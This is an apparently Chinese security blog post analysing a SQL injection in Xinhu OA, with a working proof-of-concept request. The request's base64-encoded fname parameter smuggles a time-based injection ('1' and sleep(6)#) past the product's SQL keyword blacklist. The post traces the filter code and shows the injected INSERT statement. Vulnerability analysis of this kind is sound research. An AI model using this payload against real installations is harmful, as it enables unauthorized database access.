@@ -1,0 +1,310 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="d468d27c5b208dfaead46313ec79b0ca">信呼 OA 最新 sql 注入分析</h1>
+<h2 data-content="1" id="32901273eef4f58e159c3b4fdede67a4">前言</h2>
+<p>最近看到了 xinhuOA 又出了一个 SQL 注入的漏洞，但是其 OA 是对我们的 sql 是有防护的，但是任然可以进行 sql 注入，大概看了一下绕过逻辑，觉得在绕过 waf 情况下，逻辑绕过还是很强的</p>
+<h2 data-content="1" id="a0167daa05af5804efa7653fea17c3c3">环境搭建</h2>
+<p>下载源码<br/>
+<a href="https://github.com/rainrocka/xinhu" target="_blank">https://github.com/rainrocka/xinhu</a><br/>
+然后直接使用 PHPstudy 搭建就 ok</p>
+<p>一开始的账号密码是<br/>
+admin<br/>
+123456<br/>
+然后进去之后需要强制修改密码，防止弱密码</p>
+<p>来到<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20250110150557-570fefcc-cf21-1.png"/></p>
+<p>这个界面就是搭建成功</p>
+<h2 data-content="1" id="2c33d7d26a52d7cbb9546fb0f4ace8c5">漏洞复现</h2>
+<p>payload 如下</p>
+<div class="highlight"><pre><span></span><span class="x">GET /api.php?a=getmfilv&amp;m=upload|api&amp;d=task&amp;fileid=1&amp;fname=MScgYW5kIHNsZWVwKDYpIw== HTTP/1.1</span>
+<span class="x">Host: xinhu:5348</span>
+<span class="x">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36</span>
+<span class="x">Accept: */*</span>
+<span class="x">X-Requested-With: XMLHttpRequest</span>
+<span class="x">Referer: http://xinhu:5348/</span>
+<span class="x">Accept-Encoding: gzip, deflate, br</span>
+<span class="x">Accept-Language: zh-CN,zh;q=0.9</span>
+<span class="x">Cookie: PHPSESSID=920tmlvqknnacst79p9c5d3h66; deviceid=1735887216564; xinhu_mo_adminid=oo0ob0vv0bdd0bhb0kr0bhh0bbk0oo0gb0rd0bhx0oo0ro0oe0gr06; xinhu_ca_adminuser=admin; xinhu_ca_rempass=1; xinhu_ca_adminpass=oo0rx0oe0bdd0or0kr0rg0gh06</span>
+<span class="x">Connection: keep-alive</span>
+</pre></div>
+<p>其中 fname 参数是关键，解码后内容如下</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20250110150557-5775bd5c-cf21-1.png"/></p>
+<p>然后我们发送 payload</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20250110150558-57ed65dc-cf21-1.png"/><br/>
+可以发现 sql 语句是执行了的</p>
+<h2 data-content="1" id="85e169250926aab1336fc27fb654f75a">漏洞分析</h2>
+<p>我们可以看到基础的路由规则</p>
+<div class="highlight"><pre><span></span><span class="x">/**</span>
+<span class="x">*   api的入口地址请求访问，访问方法：http://我的域名/api.php?m=index&amp;a=方法</span>
+<span class="x">*   主页：http://www.rockoa.com/</span>
+<span class="x">*   软件：信呼</span>
+<span class="x">*   作者：雨中磐石(rainrock)</span>
+<span class="x">*/</span>
+</pre></div>
+<p>是根据 api 调用来的</p>
+<p>首先就是根据</p>
+<div class="highlight"><pre><span></span><span class="x">a=getmfilv&amp;m=upload|api&amp;d=task&amp;fileid=1&amp;fname=MScgYW5kIHNsZWVwKDYpIw==</span>
+</pre></div>
+<p>是什么意思</p>
+<p>然后找到对应的</p>
+<div class="highlight"><pre><span></span><span class="x">include_once('include/View.php');</span>
+</pre></div>
+<p>View.php</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$ajaxbool</span><span class="p">))</span><span class="nv">$ajaxbool</span> <span class="o">=</span> <span class="nv">$rock</span><span class="o">-&gt;</span><span class="na">jm</span><span class="o">-&gt;</span><span class="na">gettoken</span><span class="p">(</span><span class="s1">'ajaxbool'</span><span class="p">,</span> <span class="s1">'false'</span><span class="p">);</span>
+<span class="nv">$ajaxbool</span>   <span class="o">=</span> <span class="nv">$rock</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'ajaxbool'</span><span class="p">,</span> <span class="nv">$ajaxbool</span><span class="p">);</span>
+<span class="nv">$p</span>          <span class="o">=</span> <span class="nx">PROJECT</span><span class="p">;</span>
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$m</span><span class="p">))</span><span class="nv">$m</span><span class="o">=</span><span class="s1">'index'</span><span class="p">;</span>
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$a</span><span class="p">))</span><span class="nv">$a</span><span class="o">=</span><span class="s1">'default'</span><span class="p">;</span>
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span><span class="nv">$d</span><span class="o">=</span><span class="s1">''</span><span class="p">;</span>
+<span class="nv">$m</span>          <span class="o">=</span> <span class="nv">$rock</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'m'</span><span class="p">,</span> <span class="nv">$m</span><span class="p">);</span>
+<span class="nv">$a</span>          <span class="o">=</span> <span class="nv">$rock</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'a'</span><span class="p">,</span> <span class="nv">$a</span><span class="p">);</span>
+<span class="nv">$d</span>          <span class="o">=</span> <span class="nv">$rock</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'d'</span><span class="p">,</span> <span class="nv">$d</span><span class="p">);</span>
+
+<span class="nb">define</span><span class="p">(</span><span class="s1">'M'</span><span class="p">,</span> <span class="nv">$m</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">'A'</span><span class="p">,</span> <span class="nv">$a</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">'D'</span><span class="p">,</span> <span class="nv">$d</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">'P'</span><span class="p">,</span> <span class="nv">$p</span><span class="p">);</span>
+
+<span class="nv">$_m</span>         <span class="o">=</span> <span class="nv">$m</span><span class="p">;</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$rock</span><span class="o">-&gt;</span><span class="na">contain</span><span class="p">(</span><span class="nv">$m</span><span class="p">,</span> <span class="s1">'|'</span><span class="p">)){</span>
+    <span class="nv">$_mas</span>   <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">'|'</span><span class="p">,</span> <span class="nv">$m</span><span class="p">);</span>
+    <span class="nv">$m</span>      <span class="o">=</span> <span class="nv">$_mas</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+    <span class="nv">$_m</span>     <span class="o">=</span> <span class="nv">$_mas</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+<span class="p">}</span>
+<span class="k">include_once</span><span class="p">(</span><span class="nv">$rock</span><span class="o">-&gt;</span><span class="na">strformat</span><span class="p">(</span><span class="s1">'?0/?1/?1Action.php'</span><span class="p">,</span><span class="nx">ROOT_PATH</span><span class="p">,</span> <span class="nv">$p</span><span class="p">));</span>
+<span class="nv">$rand</span>       <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s1">'YmdHis'</span><span class="p">)</span><span class="o">.</span><span class="nb">rand</span><span class="p">(</span><span class="mi">1000</span><span class="p">,</span><span class="mi">9999</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">!=</span><span class="s1">'/'</span> <span class="o">&amp;&amp;</span> <span class="nv">$d</span><span class="o">!=</span><span class="s1">''</span><span class="p">)</span><span class="nv">$d</span><span class="o">.=</span><span class="s1">'/'</span><span class="p">;</span>
+<span class="nv">$errormsg</span>   <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+<span class="nv">$methodbool</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+<span class="nv">$actpath</span>    <span class="o">=</span> <span class="nv">$rock</span><span class="o">-&gt;</span><span class="na">strformat</span><span class="p">(</span><span class="s1">'?0/?1/?2?3'</span><span class="p">,</span><span class="nx">ROOT_PATH</span><span class="p">,</span> <span class="nv">$p</span><span class="p">,</span> <span class="nv">$d</span><span class="p">,</span> <span class="nv">$_m</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">'ACTPATH'</span><span class="p">,</span> <span class="nv">$actpath</span><span class="p">);</span>
+<span class="nv">$actfile</span>    <span class="o">=</span> <span class="nv">$rock</span><span class="o">-&gt;</span><span class="na">strformat</span><span class="p">(</span><span class="s1">'?0/?1Action.php'</span><span class="p">,</span><span class="nv">$actpath</span><span class="p">,</span> <span class="nv">$m</span><span class="p">);</span>
+<span class="nv">$actfile1</span>   <span class="o">=</span> <span class="nv">$rock</span><span class="o">-&gt;</span><span class="na">strformat</span><span class="p">(</span><span class="s1">'?0/?1Action.php'</span><span class="p">,</span><span class="nv">$actpath</span><span class="p">,</span> <span class="nv">$_m</span><span class="p">);</span>
+<span class="nv">$actbstr</span>    <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$actfile1</span><span class="p">))</span><span class="k">include_once</span><span class="p">(</span><span class="nv">$actfile1</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$actfile</span><span class="p">)){</span>
+    <span class="k">include_once</span><span class="p">(</span><span class="nv">$actfile</span><span class="p">);</span>
+    <span class="nv">$clsname</span>    <span class="o">=</span> <span class="s1">''</span><span class="o">.</span><span class="nv">$m</span><span class="o">.</span><span class="s1">'ClassAction'</span><span class="p">;</span>
+    <span class="nv">$xhrock</span>     <span class="o">=</span> <span class="k">new</span> <span class="nv">$clsname</span><span class="p">();</span>
+    <span class="nv">$actname</span>    <span class="o">=</span> <span class="s1">''</span><span class="o">.</span><span class="nv">$a</span><span class="o">.</span><span class="s1">'Action'</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$ajaxbool</span> <span class="o">==</span> <span class="s1">'true'</span><span class="p">)</span><span class="nv">$actname</span> <span class="o">=</span> <span class="s1">''</span><span class="o">.</span><span class="nv">$a</span><span class="o">.</span><span class="s1">'Ajax'</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">method_exists</span><span class="p">(</span><span class="nv">$xhrock</span><span class="p">,</span> <span class="nv">$actname</span><span class="p">)){</span>
+        <span class="nv">$xhrock</span><span class="o">-&gt;</span><span class="na">beforeAction</span><span class="p">();</span>
+        <span class="nv">$actbstr</span> <span class="o">=</span> <span class="nv">$xhrock</span><span class="o">-&gt;</span><span class="nv">$actname</span><span class="p">();</span>
+        <span class="nv">$xhrock</span><span class="o">-&gt;</span><span class="na">bodyMessage</span> <span class="o">=</span> <span class="nv">$actbstr</span><span class="p">;</span>
+        <span class="k">if</span><span class="p">(</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$actbstr</span><span class="p">)){</span><span class="k">echo</span> <span class="nv">$actbstr</span><span class="p">;</span><span class="nv">$xhrock</span><span class="o">-&gt;</span><span class="na">display</span><span class="o">=</span><span class="k">false</span><span class="p">;}</span>
+        <span class="k">if</span><span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$actbstr</span><span class="p">)){</span><span class="k">echo</span> <span class="nb">json_encode</span><span class="p">(</span><span class="nv">$actbstr</span><span class="p">);</span><span class="nv">$xhrock</span><span class="o">-&gt;</span><span class="na">display</span><span class="o">=</span><span class="k">false</span><span class="p">;}</span>
+    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+        <span class="nv">$methodbool</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+        <span class="k">if</span><span class="p">(</span><span class="nv">$ajaxbool</span> <span class="o">==</span> <span class="s1">'false'</span><span class="p">)</span><span class="k">echo</span> <span class="s1">''</span><span class="o">.</span><span class="nv">$actname</span><span class="o">.</span><span class="s1">' not found;'</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="nv">$xhrock</span><span class="o">-&gt;</span><span class="na">afterAction</span><span class="p">();</span>
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+    <span class="k">echo</span> <span class="s1">'actionfile not exists;'</span><span class="p">;</span>
+    <span class="nv">$xhrock</span>     <span class="o">=</span> <span class="k">new</span> <span class="nx">Action</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="nv">$_showbool</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$xhrock</span><span class="o">-&gt;</span><span class="na">display</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$ajaxbool</span> <span class="o">==</span> <span class="s1">'html'</span> <span class="o">||</span> <span class="nv">$ajaxbool</span> <span class="o">==</span> <span class="s1">'false'</span><span class="p">)){</span>
+    <span class="nv">$xhrock</span><span class="o">-&gt;</span><span class="na">smartydata</span><span class="p">[</span><span class="s1">'p'</span><span class="p">]</span>    <span class="o">=</span> <span class="nv">$p</span><span class="p">;</span>
+    <span class="nv">$xhrock</span><span class="o">-&gt;</span><span class="na">smartydata</span><span class="p">[</span><span class="s1">'a'</span><span class="p">]</span>    <span class="o">=</span> <span class="nv">$a</span><span class="p">;</span>
+    <span class="nv">$xhrock</span><span class="o">-&gt;</span><span class="na">smartydata</span><span class="p">[</span><span class="s1">'m'</span><span class="p">]</span>    <span class="o">=</span> <span class="nv">$m</span><span class="p">;</span>
+    <span class="nv">$xhrock</span><span class="o">-&gt;</span><span class="na">smartydata</span><span class="p">[</span><span class="s1">'d'</span><span class="p">]</span>    <span class="o">=</span> <span class="nv">$d</span><span class="p">;</span>
+    <span class="nv">$xhrock</span><span class="o">-&gt;</span><span class="na">smartydata</span><span class="p">[</span><span class="s1">'rand'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$rand</span><span class="p">;</span>
+    <span class="nv">$xhrock</span><span class="o">-&gt;</span><span class="na">smartydata</span><span class="p">[</span><span class="s1">'qom'</span><span class="p">]</span>  <span class="o">=</span> <span class="nx">QOM</span><span class="p">;</span>
+    <span class="nv">$xhrock</span><span class="o">-&gt;</span><span class="na">smartydata</span><span class="p">[</span><span class="s1">'path'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">PATH</span><span class="p">;</span>
+    <span class="nv">$xhrock</span><span class="o">-&gt;</span><span class="na">smartydata</span><span class="p">[</span><span class="s1">'sysurl'</span><span class="p">]</span><span class="o">=</span> <span class="nx">SYSURL</span><span class="p">;</span>
+    <span class="nv">$temppath</span>                   <span class="o">=</span> <span class="s1">''</span><span class="o">.</span><span class="nx">ROOT_PATH</span><span class="o">.</span><span class="s1">'/'</span><span class="o">.</span><span class="nv">$p</span><span class="o">.</span><span class="s1">'/'</span><span class="p">;</span>
+    <span class="nv">$tplpaths</span>                   <span class="o">=</span> <span class="s1">''</span><span class="o">.</span><span class="nv">$temppath</span><span class="o">.</span><span class="s1">''</span><span class="o">.</span><span class="nv">$d</span><span class="o">.</span><span class="s1">''</span><span class="o">.</span><span class="nv">$m</span><span class="o">.</span><span class="s1">'/'</span><span class="p">;</span>
+    <span class="nv">$tplname</span>                    <span class="o">=</span> <span class="s1">'tpl_'</span><span class="o">.</span><span class="nv">$m</span><span class="o">.</span><span class="s1">''</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$a</span><span class="o">!=</span><span class="s1">'default'</span><span class="p">)</span><span class="nv">$tplname</span>  <span class="o">.=</span> <span class="s1">'_'</span><span class="o">.</span><span class="nv">$a</span><span class="o">.</span><span class="s1">''</span><span class="p">;</span>
+    <span class="nv">$tplname</span>                   <span class="o">.=</span> <span class="s1">'.'</span><span class="o">.</span><span class="nv">$xhrock</span><span class="o">-&gt;</span><span class="na">tpldom</span><span class="o">.</span><span class="s1">''</span><span class="p">;</span>
+    <span class="nv">$mpathname</span>                  <span class="o">=</span> <span class="nv">$tplpaths</span><span class="o">.</span><span class="nv">$tplname</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$xhrock</span><span class="o">-&gt;</span><span class="na">displayfile</span><span class="o">!=</span><span class="s1">''</span> <span class="o">&amp;&amp;</span> <span class="nb">file_exists</span><span class="p">(</span><span class="nv">$xhrock</span><span class="o">-&gt;</span><span class="na">displayfile</span><span class="p">))</span><span class="nv">$mpathname</span> <span class="o">=</span> <span class="nv">$xhrock</span><span class="o">-&gt;</span><span class="na">displayfile</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$mpathname</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$methodbool</span><span class="p">){</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$methodbool</span><span class="p">){</span>
+            <span class="nv">$errormsg</span>   <span class="o">=</span> <span class="s1">'in ('</span><span class="o">.</span><span class="nv">$m</span><span class="o">.</span><span class="s1">') not found Method('</span><span class="o">.</span><span class="nv">$a</span><span class="o">.</span><span class="s1">');'</span><span class="p">;</span>
+        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+            <span class="nv">$errormsg</span>   <span class="o">=</span> <span class="s1">''</span><span class="o">.</span><span class="nv">$tplname</span><span class="o">.</span><span class="s1">' not exists;'</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">echo</span> <span class="nv">$errormsg</span><span class="p">;</span>
+    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+        <span class="nv">$_showbool</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$xhrock</span><span class="o">-&gt;</span><span class="na">display</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$ajaxbool</span> <span class="o">==</span> <span class="s1">'html'</span> <span class="o">||</span> <span class="nv">$xhrock</span><span class="o">-&gt;</span><span class="na">tpltype</span><span class="o">==</span><span class="s1">'html'</span> <span class="o">||</span> <span class="nv">$ajaxbool</span> <span class="o">==</span> <span class="s1">'false'</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$_showbool</span><span class="p">){</span>
+    <span class="nv">$xhrock</span><span class="o">-&gt;</span><span class="na">setHtmlData</span><span class="p">();</span>
+    <span class="nv">$da</span> <span class="o">=</span> <span class="nv">$xhrock</span><span class="o">-&gt;</span><span class="na">smartydata</span><span class="p">;</span>
+    <span class="k">foreach</span><span class="p">(</span><span class="nv">$xhrock</span><span class="o">-&gt;</span><span class="na">assigndata</span> <span class="k">as</span> <span class="nv">$_k</span><span class="o">=&gt;</span><span class="nv">$_v</span><span class="p">)</span><span class="nv">$$_k</span><span class="o">=</span><span class="nv">$_v</span><span class="p">;</span>
+    <span class="k">include_once</span><span class="p">(</span><span class="nv">$mpathname</span><span class="p">);</span>
+    <span class="nv">$_showbool</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>这么长的代码交给聪明的 gpt</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20250110150559-584dc6e8-cf21-1.png"/></p>
+<p>那我们定位到 uploadAction.php 的 getmfilvAction 方法</p>
+<div class="highlight"><pre><span></span><span class="x">public function getmfilvAction()</span>
+<span class="x">{</span>
+<span class="x">    $fileid = (int)$this-&gt;get('fileid','0');</span>
+<span class="x">    $frs    = m('file')-&gt;getone($fileid);</span>
+<span class="x">    if(!$frs)return returnerror('不存在');</span>
+
+<span class="x">    $lujing = $frs['filepathout'];</span>
+<span class="x">    if(isempt($lujing)){</span>
+<span class="x">        $lujing = $frs['filepath'];</span>
+<span class="x">        if(substr($lujing,0,4)!='http' &amp;&amp; !file_exists($lujing))return returnerror('文件不存在了');</span>
+<span class="x">    }</span>
+<span class="x">    $fileext = $frs['fileext'];</span>
+
+<span class="x">    $fname = $this-&gt;jm-&gt;base64decode($this-&gt;get('fname'));</span>
+<span class="x">    $fname = (isempt($fname)) ? $frs['filename'] : ''.$fname.'.'.$fileext.'';</span>
+
+<span class="x">    $filepath = ''.UPDIR.'/'.date('Y-m').'/'.date('d').'_rocktpl'.rand(1000,9999).'_'.$fileid.'.'.$fileext.'';</span>
+<span class="x">    $this-&gt;rock-&gt;createtxt($filepath, file_get_contents($lujing));</span>
+
+<span class="x">    $uarr = array(</span>
+<span class="x">        'filename' =&gt; $fname,</span>
+<span class="x">        'fileext' =&gt; $fileext,</span>
+<span class="x">        'filepath' =&gt; $filepath,</span>
+<span class="x">        'filesize' =&gt; filesize($filepath),</span>
+<span class="x">        'filesizecn' =&gt; $this-&gt;rock-&gt;formatsize(filesize($filepath)),</span>
+<span class="x">        'optid'     =&gt; $this-&gt;adminid,</span>
+<span class="x">        'optname'   =&gt; $this-&gt;adminname,</span>
+<span class="x">        'adddt'     =&gt; $this-&gt;rock-&gt;now,</span>
+<span class="x">        'ip'        =&gt; $this-&gt;rock-&gt;ip,</span>
+<span class="x">        'web'       =&gt; $this-&gt;rock-&gt;web,</span>
+<span class="x">    );</span>
+<span class="x">    $uarr['id'] = m('file')-&gt;insert($uarr);</span>
+
+<span class="x">    return returnsuccess($uarr);</span>
+<span class="x">}</span>
+</pre></div>
+<p>其中和我们 sql 相关的是在</p>
+<div class="highlight"><pre><span></span><span class="x">$uarr['id'] = m('file')-&gt;insert($uarr);</span>
+</pre></div>
+<p>首先我们看能够控制的参数是哪些<br/>
+fileid 和 fname</p>
+<p>但是</p>
+<div class="highlight"><pre><span></span><span class="x">$fileid = (int)$this-&gt;get('fileid','0');</span>
+</pre></div>
+<p>被 int 了</p>
+<p>然后对 sql 是有防护的，如果是在 insert 防护的，那其实是大概率不能绕过的，这里是在 get 防护的，也就是我们获取参数的时候</p>
+<p>跟着调用栈</p>
+<div class="highlight"><pre><span></span><span class="x">rockClass.php:111, rockClass-&gt;get()</span>
+<span class="x">Action.php:152, uploadClassAction-&gt;get()</span>
+<span class="x">uploadAction.php:499, uploadClassAction-&gt;getmfilvAction()</span>
+<span class="x">View.php:42, include_once()</span>
+<span class="x">api.php:39, {main}()</span>
+</pre></div>
+<p>在 rockClass.php</p>
+<div class="highlight"><pre><span></span><span class="x">public function get($name,$dev='', $lx=0)</span>
+<span class="x">{</span>
+<span class="x">    $val=$dev;</span>
+<span class="x">    if(isset($_GET[$name]))$val=$_GET[$name];</span>
+<span class="x">    if($this-&gt;isempt($val))$val=$dev;</span>
+<span class="x">    return $this-&gt;jmuncode($val, $lx, $name);</span>
+<span class="x">}</span>
+</pre></div>
+<p>我们传入的值会进入 jmuncode 方法</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20250110150600-58b51122-cf21-1.png"/></p>
+<p>然后进入 jmuncode</p>
+<div class="highlight"><pre><span></span><span class="x">public function jmuncode($s, $lx=0, $na='')</span>
+<span class="x">{</span>
+<span class="x">    $jmbo = false;$s = (string)$s;</span>
+<span class="x">    if($lx==3)$jmbo = $this-&gt;isjm($s);</span>
+<span class="x">    if(substr($s, 0, 7)=='rockjm_' || $lx == 1 || $jmbo){</span>
+<span class="x">        $s = str_replace('rockjm_', '', $s);</span>
+<span class="x">        $s = $this-&gt;jm-&gt;uncrypt($s);</span>
+<span class="x">        if($lx==1){</span>
+<span class="x">            $jmbo = $this-&gt;isjm($s);</span>
+<span class="x">            if($jmbo)$s = $this-&gt;jm-&gt;uncrypt($s);</span>
+<span class="x">        }</span>
+<span class="x">    }</span>
+<span class="x">    if(substr($s, 0, 7)=='basejm_' || $lx==5){</span>
+<span class="x">        $s = str_replace('basejm_', '', $s);</span>
+<span class="x">        $s = $this-&gt;jm-&gt;base64decode($s);</span>
+<span class="x">    }</span>
+<span class="x">    $s=str_replace("'", '&amp;#39', $s);</span>
+<span class="x">    $s=str_replace('%20', '', $s);</span>
+<span class="x">    if($lx==2)$s=str_replace(array('{','}'), array('[H1]','[H2]'), $s);</span>
+<span class="x">    $str = strtolower($s);</span>
+<span class="x">    foreach($this-&gt;lvlaras as $v1)if($this-&gt;contain($str, $v1)){</span>
+<span class="x">        $this-&gt;debug(''.$na.'《'.$s.'》error:包含非法字符《'.$v1.'》','params_err');</span>
+<span class="x">        $s = $this-&gt;lvlarrep($str, $v1);</span>
+<span class="x">        $str = $s;</span>
+<span class="x">    }</span>
+<span class="x">    $cslv = array('m','a','p','d','ip','web','host','ajaxbool','token','adminid');</span>
+<span class="x">    if(in_array($na, $cslv))$s = $this-&gt;xssrepstr($s);</span>
+<span class="x">    return $this-&gt;reteistrs($s);</span>
+<span class="x">}</span>
+</pre></div>
+<p>其中会在 lvlaras 作为名单循环检测，我们可以看到构造方法</p>
+<div class="highlight"><pre><span></span><span class="x">public function __construct()</span>
+<span class="x">{       </span>
+<span class="x">    $this-&gt;ip       = $this-&gt;getclientip();</span>
+<span class="x">    $this-&gt;host     = isset($_SERVER['HTTP_HOST'])      ? $_SERVER['HTTP_HOST']     : '' ;</span>
+<span class="x">    if($this-&gt;host &amp;&amp; substr($this-&gt;host,-3)==':80')$this-&gt;host = str_replace(':80', '', $this-&gt;host);</span>
+<span class="x">    $this-&gt;url      = '';</span>
+<span class="x">    $this-&gt;isqywx   = false;</span>
+<span class="x">    $this-&gt;win      = php_uname();</span>
+<span class="x">    $this-&gt;HTTPweb  = isset($_SERVER['HTTP_USER_AGENT'])? $_SERVER['HTTP_USER_AGENT']   : '' ;</span>
+<span class="x">    $this-&gt;web      = $this-&gt;getbrowser();</span>
+<span class="x">    $this-&gt;unarr    = explode(',','1,2');</span>
+<span class="x">    $this-&gt;now      = $this-&gt;now();</span>
+<span class="x">    $this-&gt;date     = date('Y-m-d');</span>
+<span class="x">    $this-&gt;lvlaras  = explode(',','select ,</span>
+<span class="x">    alter table,delete ,drop ,update ,insert into,load_file,/*,*/,union,&lt;script,&lt;/script,sleep(,outfile,eval(,user(,phpinfo(),select*,union%20,sleep%20,select%20,delete%20,drop%20,and%20');</span>
+<span class="x">    $this-&gt;lvlaraa  = explode(',','select,alter,delete,drop,update,/*,*/,insert,from,time_so_sec,convert,from_unixtime,unix_timestamp,curtime,time_format,union,concat,information_schema,group_concat,length,load_file,outfile,database,system_user,current_user,user(),found_rows,declare,master,exec,(),select*from,select*');</span>
+<span class="x">    $this-&gt;lvlarab  = array();</span>
+<span class="x">    foreach($this-&gt;lvlaraa as $_i)$this-&gt;lvlarab[]='';</span>
+<span class="x">}</span>
+</pre></div>
+<p>其中是一些 sql 黑名单，但是为什么我们能够绕过呢</p>
+<p>很简单</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20250110150600-590c9c94-cf21-1.png"/></p>
+<p>因为我们输入的 base64 的字符，当然检测不出来，而带入 sql 语句的时候</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20250110150601-597b93a6-cf21-1.png"/></p>
+<p>可以看到是 base64 解码后的</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20250110150602-59ecbcf4-cf21-1.png"/><br/>
+对应着我们解码的逻辑，所以可以说是一个逻辑漏洞了</p>
+<p>然后我们看看对 sql 的语句处理</p>
+<div class="highlight"><pre><span></span><span class="x">mysql.php:545, mysqliClass-&gt;record()</span>
+<span class="x">Model.php:93, fileClassModel-&gt;record()</span>
+<span class="x">Model.php:104, fileClassModel-&gt;insert()</span>
+<span class="x">uploadAction.php:528, uploadClassAction-&gt;getmfilvAction()</span>
+<span class="x">View.php:42, include_once()</span>
+<span class="x">api.php:39, {main}()</span>
+</pre></div>
+<p>一路跟进</p>
+<div class="highlight"><pre><span></span><span class="x">public function record($table,$array,$where='')</span>
+<span class="x">{</span>
+<span class="x">    $addbool    = true;</span>
+<span class="x">    if(!$this-&gt;isempt($where))$addbool=false;</span>
+<span class="x">    $cont       = '';</span>
+<span class="x">    if(is_array($array)){</span>
+<span class="x">        foreach($array as $key=&gt;$val){</span>
+<span class="x">            $cont.=",`$key`=".$this-&gt;toaddval($val)."";</span>
+<span class="x">        }</span>
+<span class="x">        $cont   = substr($cont,1);</span>
+<span class="x">    }else{</span>
+<span class="x">        $cont   = $array;</span>
+<span class="x">    }</span>
+<span class="x">    $table = $this-&gt;gettables($table);</span>
+<span class="x">    if($addbool){</span>
+<span class="x">        $sql="insert into $table set $cont";</span>
+<span class="x">    }else{</span>
+<span class="x">        $where = $this-&gt;getwhere($where);</span>
+<span class="x">        $sql="update $table set $cont where $where";</span>
+<span class="x">    }</span>
+<span class="x">    return $this-&gt;tranbegin($sql);</span>
+<span class="x">}</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20250110150603-5a7fb192-cf21-1.png"/><br/>
+最后得到的 sql 语句</p>
+<div class="highlight"><pre><span></span><span class="x">insert into `xinhu_file` set `filename`='1' and sleep(6)#.png',`fileext`='png',`filepath`='upload/2025-01/03_rocktpl5508_1.png',`filesize`='3970',`filesizecn`='3.88 KB',`optid`='1',`optname`='绠＄悊鍛�',`adddt`='2025-01-03 16:51:57',`ip`='127.0.0.1',`web`='Chrome'</span>
+</pre></div>
+<p>所以导致了 sql 注入</p>
+<p>参考<a href="https://forum.butian.net/article/613" target="_blank">https://forum.butian.net/article/613</a></p>
+</div>
+</div>
